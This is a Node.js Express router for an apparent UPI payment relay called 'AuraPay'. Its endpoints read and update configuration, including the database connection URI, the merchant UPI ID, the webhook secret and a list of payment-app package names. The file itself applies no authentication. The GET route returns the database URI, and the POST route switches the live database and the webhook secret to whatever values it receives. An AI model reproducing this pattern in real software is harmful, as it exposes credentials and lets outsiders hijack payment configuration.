const express = require('express');
const router = express.Router();
const mongoose = require('mongoose');
const SystemConfig = require('../models/SystemConfig');
const { connectDB, getDbStatus, getCurrentUri } = require('../config/db');
const { setCachedSecret } = require('../middleware/auth');

/**
 * GET /api/relay/system-config
 * Retrieves current server runtime configuration.
 */
router.get('/', async (req, res) => {
  try {
    let config = null;
    if (mongoose.connection.readyState === 1) {
      try {
        config = await SystemConfig.findOne({ configKey: 'global_config' });
        if (!config) {
          config = await SystemConfig.create({
            configKey: 'global_config',
            mongoUri: getCurrentUri()
          });
        }
      } catch (_) {}
    }

    if (!config) {
      // Fallback if DB is disconnected
      config = {
        mongoUri: getCurrentUri(),
        merchantUpiVpa: 'aurapay.merchant@okaxis',
        merchantName: 'AuraPay Merchant Store',
        targetPackages: [
          'com.google.nbu.paisa.merchant',
          'com.phonepe.app.business',
          'net.one97.paytm',
          'com.bharatpe.app',
          'com.google.android.apps.nbu.paisa.user'
        ],
        updatedAt: new Date()
      };
    }

    return res.status(200).json({
      success: true,
      config: {
        mongoUri: config.mongoUri,
        merchantUpiVpa: config.merchantUpiVpa,
        merchantName: config.merchantName,
        targetPackages: config.targetPackages,
        updatedAt: config.updatedAt
      },
      dbStatus: getDbStatus()
    });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * POST /api/relay/system-config
 * Dynamically updates configuration without rebuilding APK or restarting the process.
 * If mongoUri is updated, switches the database connection on the fly.
 */
router.post('/', async (req, res) => {
  try {
    const {
      mongoUri,
      merchantUpiVpa,
      merchantName,
      webhookSecret,
      targetPackages
    } = req.body;

    let config = await SystemConfig.findOne({ configKey: 'global_config' });
    if (!config) {
      config = new SystemConfig({ configKey: 'global_config' });
    }

    let dbSwitchResult = null;
    if (mongoUri && mongoUri.trim() !== '' && mongoUri !== config.mongoUri) {
      console.log(`[AuraPay Config] Requesting runtime DB switch to: ${mongoUri}`);
      dbSwitchResult = await connectDB(mongoUri);
      if (dbSwitchResult.success) {
        config.mongoUri = mongoUri;
      }
    }

    if (merchantUpiVpa) config.merchantUpiVpa = merchantUpiVpa;
    if (merchantName) config.merchantName = merchantName;
    if (webhookSecret) {
      config.webhookSecret = webhookSecret;
      setCachedSecret(webhookSecret);
    }
    if (Array.isArray(targetPackages)) config.targetPackages = targetPackages;

    config.updatedAt = new Date();
    await config.save();

    return res.status(200).json({
      success: true,
      message: 'System configuration updated successfully',
      config: {
        mongoUri: config.mongoUri,
        merchantUpiVpa: config.merchantUpiVpa,
        merchantName: config.merchantName,
        targetPackages: config.targetPackages,
        updatedAt: config.updatedAt
      },
      dbSwitchResult,
      dbStatus: getDbStatus()
    });
  } catch (err) {
    console.error('[AuraPay Config] Update error:', err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

module.exports = router;
